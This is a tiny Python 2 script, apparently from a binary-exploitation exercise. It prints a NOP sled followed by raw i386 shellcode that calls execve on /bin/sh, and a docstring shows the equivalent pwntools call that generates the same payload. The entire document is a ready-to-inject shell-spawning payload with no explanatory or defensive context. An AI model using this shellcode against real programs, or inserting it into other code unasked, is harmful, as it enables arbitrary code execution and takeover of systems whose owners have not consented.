"""
from pwn import *

print asm(shellcraft.i386.sh())
"""

print '\x90' * 50 + 'jhh///sh/bin\x89\xe31\xc9j\x0bX\x99\xcd\x80'
